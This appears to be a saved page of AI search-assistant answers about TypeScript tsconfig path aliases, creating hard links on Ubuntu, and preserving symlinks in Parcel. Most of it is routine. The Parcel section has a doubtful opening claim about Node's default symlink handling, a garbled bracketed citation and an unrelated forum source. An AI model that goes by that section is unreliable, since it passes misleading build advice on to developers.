<mark><strong><span>Yes, you can use<span> </span></span><code dir="ltr">paths</code><span> </span>without the<span> </span><code dir="ltr">@</code><span> </span>prefix.</strong></mark> The `@` symbol is just a popular community convention used to visually distinguish aliased paths from standard `node_modules` packages. TypeScript allows any string pattern.

Here is how you can configure a prefix-free path mapping:

json

```
{
  "compilerOptions": {
    "paths": {
      "parent/*": ["../*"],
      "shared/*": ["../shared/*"]
    }
  }
}
```

Use code with caution.

You can then import your files using the plain name:

typescript

```
import { SharedHelper } from 'parent/helpers/shared';
```

Use code with caution.

### ⚠️ Important Gotcha: Naming Conflicts

When you omit the `@` prefix, ensure your chosen alias **does not conflict with an existing npm package**.

For example, if you name your path `"fs/*"` or `"react/*"`, TypeScript will prioritize your local paths over the actual node modules, which will break your imports.

To ensure this works seamlessly across your entire setup, let me know:

- What **bundler or runtime** (like Vite, Webpack, or ts-node) you are using, since some require a plugin to resolve non-prefixed paths correctly during builds.




# tsconfig paths

## tsconfig paths

The `paths` property in a `tsconfig.json` file allows you to **declare custom module path aliases**, which eliminates messy relative imports (like `../../components/Button`) and replaces them with clean absolute-style paths (like `@/components/Button`). [link](https://www.youtube.com/shorts/h1ZPBYhTT1k)

While **`paths` informs the TypeScript compiler (`tsc`)** where to find type definitions for your aliases during development, **`tsc` does not rewrite these paths** when compiling your code to JavaScript. You will need a bundler or runtime tool to handle them in production. [link](https://www.reddit.com/r/typescript/comments/1c1gmsz/rant%5Ftsconfig%5Fpaths%5Fare%5Fnot%5Fworth%5Fthe%5Fhassle/)

***

### 1. Basic Configuration

To set up path aliases, update the `compilerOptions` in your `tsconfig.json`. [link](https://webreaper.dev/posts/tsconfig-paths-setup/)

json

```
{
  "compilerOptions": {
    "baseUrl": ".", // Defines the root directory for relative paths (defaults to "." if omitted in newer versions)
    "paths": {
      "@/*": ["src/*"],
      "@components/*": ["src/components/*"],
      "@utils/*": ["src/utils/*"]
    }
  }
}
```

Use code with caution.

- **`baseUrl`**: Sets the base directory from which the mappings resolve.
- **`@/*`**: The custom alias prefix. The asterisk `*` acts as a wildcard matching any file path.
- **`["src/*"]`**: The physical folder the alias points to, relative to the `baseUrl`. [link](https://www.youtube.com/watch?v=i4sorpyHBg8\&t=5)

***

### 2. Usage in Code

Once configured, you can switch from fragile relative imports to clean aliases: [link](https://starter.cosmicthemes.com/blog/tsconfig-paths-setup/)

typescript

```
// ❌ Old, messy relative import
import { Button } from "../../../components/Button";
import { formatDates } from "../../utils/date";

//     Import Aliases
import { Button } from "@components/Button";
import { formatDates } from "@utils/date";
```

Use code with caution.

***

### 3. Making Paths Work at Runtime ⚙️

Because `tsc` leaves your aliases untouched in the compiled `.js` files, you must configure your runtime environment or bundler to read your `tsconfig` paths. [link](https://www.reddit.com/r/typescript/comments/1c1gmsz/rant%5Ftsconfig%5Fpaths%5Fare%5Fnot%5Fworth%5Fthe%5Fhassle/)

#### Modern Runtimes & Frameworks (Zero-Config)

If you are using modern tools, `tsconfig` paths usually work **out of the box**:

- **Next.js**, **Vite**, **Astro**, and **Angular** automatically detect and resolve `tsconfig` paths during builds.
- [Bun](https://bun.com/guides/runtime/tsconfig-paths) natively supports and dynamically resolves `tsconfig.json` paths out of the box. [link](https://www.youtube.com/watch?v=whRsz7ywYZo\&t=5)

#### Vanilla Node.js & Production

If you are running compiled JavaScript directly with Node.js, it will throw a `"Cannot find module"` error. Use one of these solutions: [link](https://npmjs.com/package/tsconfig-paths)

- **For Development (`ts-node`):** Install the [tsconfig-paths package](https://npmjs.com/package/tsconfig-paths) and execute using: `ts-node -r tsconfig-paths/register main.ts`. Alternatively, use tsx which handles path resolution seamlessly without extra configuration. [link](https://www.reddit.com/r/webdev/comments/1idvcmc/til%5Fyou%5Fneed%5Fa%5Fpackage%5Fcalled%5Ftsconfigpaths%5Fto/)
- **For Production Build Pipelines:** Use a build-time plugin like [tsconfig-replace-paths](https://www.npmjs.com/package/tsconfig-replace-paths) to structurally rewrite the aliases back into clean relative paths inside your final build directory. [link](https://www.npmjs.com/package/tsconfig-replace-paths)
- **For Webpack Environments:** Inject the [tsconfig-paths-webpack-plugin](https://www.npmjs.com/package/tsconfig-paths-webpack-plugin) directly into your Webpack resolution configuration to sync your aliases automatically. [link](https://oneuptime.com/blog/post/2026-01-24-configure-typescript-path-aliases/view)

Are you setting this up for a **specific framework/bundler** (like Vite, Next.js, or pure Node.js)? Let me know so I can provide the exact plug-and-play configuration!

- [link](https://www.reddit.com/r/typescript/comments/1c1gmsz/rant%5Ftsconfig%5Fpaths%5Fare%5Fnot%5Fworth%5Fthe%5Fhassle/)\
  Reddit\
  RANT: tsconfig paths are not worth the hassle - Reddit\
  tsconfig paths are meant to be information for the TSC compiler and not actual path aliases,
- [link](https://www.youtube.com/watch?v=whRsz7ywYZo\&t=5)\
  YouTube·Awais Mirza\
  Angular - tsconfig paths configurations\
  Sep 18, 2019 — Angular provides a good way of configuring paths for imports in TypeScript files to make your code more readable. Instead of using...\
  5m
- [link](https://www.youtube.com/watch?v=i4sorpyHBg8\&t=5)\
  YouTube·The Dev Method\
  Typescript: "paths" tsconfig\
  Nov 30, 2021 — To enable referencing nested components within the \`components\` directory, an asterisk (\`\*\`) wildcard should be added to the path ...\
  5m

Show all

## can i path to parent folders

<mark><strong><span>Yes, you can path to parent folders</span></strong></mark>, but it is generally considered a bad practice and can break build pipelines.

Because `tsconfig.json` path mappings are resolved relative to the directory specified in `baseUrl` (which is typically your project root `"."`), mapping aliases to a parent directory requires using relative path steps (`../`).

Here is how you configure it and why you should avoid it:

### How to set it up

If you have a monorepo setup or a separate project root and need an alias to step out of the current folder into a parent directory, you can write it like this:

json

```
{
  "compilerOptions": {
    "baseUrl": ".",
    "paths": {
      "@shared/*": ["../shared-packages/*"],
      "@root-config/*": ["../package.json"]
    }
  }
}
```

Use code with caution.

### ⚠️ Why this can break your project

While TypeScript will successfully find the type definitions during development, mapping to parent folders often breaks during compilation and runtime for two main reasons:

1. **`outDir` Distortion**: When `tsc` compiles your code, it tries to mirror your source directory structure inside your build folder (e.g., `dist/`). If your code imports files from a parent folder (`../`), TypeScript will unexpectedly change the internal structure of your `dist/` folder to include those parent files, which can break your deployment scripts.
2. **Bundler Failures**: Many bundlers (like Vite, Webpack, or Next.js) restrict file resolution to the project root for safety reasons. Reaching outside the project root can throw "Module not found" or security isolation errors during production builds.

### The Better Alternative

Instead of mapping upward, **move your `tsconfig.json` to the highest shared parent directory**, or use **TypeScript Project References** (via a `tsconfig.build.json` or solution-style configs) to properly link multi-package/monorepo structures together.

Are you trying to share code between **multiple projects (like a monorepo)**, or are you just trying to reference a **global config file** outside your source folder? Let me know so I can suggest the safest structural fix.

# how to hardlink on ubuntu

To create a hard link on Ubuntu, use the **`ln` command** by typing **`ln source_file target_link`** in your terminal. Unlike a symbolic (soft) link, a hard link acts as an exact copy or alias that points directly to the same underlying data on your storage drive (the same inode). [link](https://www.redhat.com/en/blog/hard-links-linux)

### How to Create a Hard Link

Open your terminal and use the following syntax:

bash

```
ln /path/to/source_file /path/to/hard_link
```

Use code with caution.

**Example:**\
If you have a file named `report.txt` and you want to create a hard link named `report_backup.txt` in the same directory, run:

bash

```
ln report.txt report_backup.txt
```

Use code with caution.

### How to Verify It Worked

You can verify that both names point to the exact same data by checking their **inode number** using the `-i` flag with `ls`: [link](https://www.redhat.com/en/blog/hard-links-linux)

bash

```
ls -i report.txt report_backup.txt
```

Use code with caution.

- **Result:** You will see the same ID number listed next to both files (e.g., `1234567 report.txt` and `1234567 report_backup.txt`). [link](https://www.youtube.com/shorts/8sihjGwamJA)

To visualize how hard links differ from soft links and how to track their unique identifiers in the filesystem, watch this demonstration:

16:12

[link](https://www.youtube.com/watch?v=VKCXygOV2uk)

Linux Fundamentals: Mastering Links: Unraveling the Magic of ...

2 years ago

YouTube · Acosta E.T.F

### Important Rules and Limitations

- **Files only:** You **cannot** create a hard link for a directory (folder). If you need to link a directory, you must use a symbolic link (`ln -s`). [link](https://askubuntu.com/questions/108771/what-is-the-difference-between-a-hard-link-and-a-symbolic-link)
- **Same storage drive:** Hard links **cannot span across different filesystems** or partitions (e.g., you cannot hardlink a file from your internal drive to an external USB drive). [link](https://www.redhat.com/en/blog/linking-linux-explained)
- **Safe deletions:** If you delete the original file, the hard link still works perfectly and retains all the data. The data is only truly deleted from your computer once _all_ hard links to it are deleted. [link](https://www.reddit.com/r/linuxquestions/comments/194oc3q/i%5Fhave%5Fa%5Fbit%5Fof%5Fa%5Fdumb%5Fquestion%5Fregarding%5Fhard/)

Would you like to know how to create a **symbolic (soft) link** instead to link folders or cross over to different drives, or do you need help managing existing links?

- [link](https://askubuntu.com/questions/108771/what-is-the-difference-between-a-hard-link-and-a-symbolic-link)\
  Ask Ubuntu\
  What is the difference between a hard link and a symbolic link?\
  1 15 When to use Soft Link: Link across filesystems: If you want to link files across the filesystems, you can only use symlinks/s...
- [link](https://www.redhat.com/en/blog/hard-links-linux)\
  Red Hat\
  Sysadmin basics: Create hard links in Linux - Red Hat\
  Oct 11, 2022 — The ln command creates links. Use the -h option to see its available parameters. To create a hard link, To prove this hard link is...
- [link](https://www.redhat.com/en/blog/linking-linux-explained)\
  Red Hat\
  Hard links and soft links in Linux explained\
  Sep 21, 2020 — The syntax for creating a hard link is: \* \`ln (original file path) (new file path)\` \* \*\*Limitations\*\* Hard links can only be creat...

Show all

# how to preserve symlink on parceljs

**Parcel explicitly follows Node's default logic by automatically preserving symlinks**. [link](https://github.com/parcel-bundler/parcel/issues/1125)

Unlike bundlers such as Webpack—which evaluate the target file's absolute path (`fs.realpath`)—\[Parcel resolves local paths using the directory structure of the symlink itself]\(1.2.1, 1.3.1). This behavior ensures that your module resolution context remains tied to where the symlink lives, effectively preventing duplicate nested package lookups. [link](https://forums.meteor.com/t/very-bumpy-upgrade-to-3-4-1-and-rspack-still-cant-build/64650)

However, local development workflows (like using `npm link` or Monorepos) can occasionally break this behavior. The underlying logic and fixes vary depending on the specific problem you are troubleshooting:

### 1. Parcel Compiles Your Code Instead of Using the Bundled Version

When a module is symlinked, **Parcel actively detects if the package has a `source` field** in its `package.json`. If it finds one, Parcel treats it as raw source code and builds it recursively using the host project's configuration. [link](https://parceljs.org/features/dependency-resolution/)

- **The Problem:** If you want your symlinked package to act exactly like an external npm package (using its pre-compiled `main` or `module` build), the presence of the `source` field will override that goal. [link](https://github.com/parcel-bundler/parcel/discussions/8547)

- **The Fix:** Remove the `"source"` field from the symlinked library’s `package.json`, or explicitly map it back to the entry file inside your host application's `package.json` using the [Parcel Aliases](https://parceljs.org/features/dependency-resolution/) feature: [link](https://parceljs.org/features/dependency-resolution/)\
  json

<!---->

```
"alias": {
  "your-symlinked-package": "./node_modules/your-symlinked-package/dist/index.js"
}
```

Use code with caution.

### 2. Live Rebuilds / HMR Are Not Triggered by Symlinked File Changes

If you are modifying code inside a symlinked directory and the hot-reloading mechanism fails to capture the update, it is usually because the underlying watcher loses track of the symlink tree boundaries. [link](https://github.com/parcel-bundler/parcel/issues/4950)

- **The Fix:** Run the Parcel development server with the `--no-cache` argument to force a fresh file evaluation:\
  bash

<!---->

```
parcel watch index.html --no-cache
```

Use code with caution.

- **Alternatively:** Clean the local cache directory entirely by executing `rm -rf .parcel-cache` before initiating your next script run. [link](https://parceljs.org/features/cli/)

### 3. Node-Level Symlink Failures (for Custom Tooling or Entry Points)

If you have written a custom script wrapping Parcel or are calling it via node executables that resolve paths too early, you must enforce the configuration directly at the Node runtime engine layer. [link](https://github.com/pnpm/pnpm/issues/244)

- **The Fix:** Pass the native runtime flag directly through your environment configuration by setting `NODE_OPTIONS`: [link](https://stackoverflow.com/questions/61132438/preserve-symbolic-link-in-mocha-js)\
  bash

<!---->

```
NODE_OPTIONS="--preserve-symlinks" parcel build index.html
```

Use code with caution.

Are you running into an **issue with a monorepo setup** (like Yarn/pnpm Workspaces), or is a specific **`npm link` dependency failing to compile**? Let me know the context so I can tailor the configuration for you.

- [link](https://github.com/parcel-bundler/parcel/issues/1125)\
  GitHub\
  Symlink realpaths · Issue #1125 · parcel-bundler/parcel\
  Node's --preserve-symlinks does not prevent getting multiple copies of the same dependencies.
- [link](https://parceljs.org/features/dependency-resolution/)\
  Parcel.js\
  Dependency resolution\
  using the alias field to replace files unconditionally, or with the source or browser fields. When the module is symlinked, compil...
- [link](https://github.com/parcel-bundler/parcel/issues/4950)\
  GitHub\
  Parcel does not watch/refresh changes inside a symlink folder #4950\
  Jul 29, 2020 — I need to stop the server, delete the cache ( rm -rf . parcel-cache ) and restart parcel to see the change.

Show all



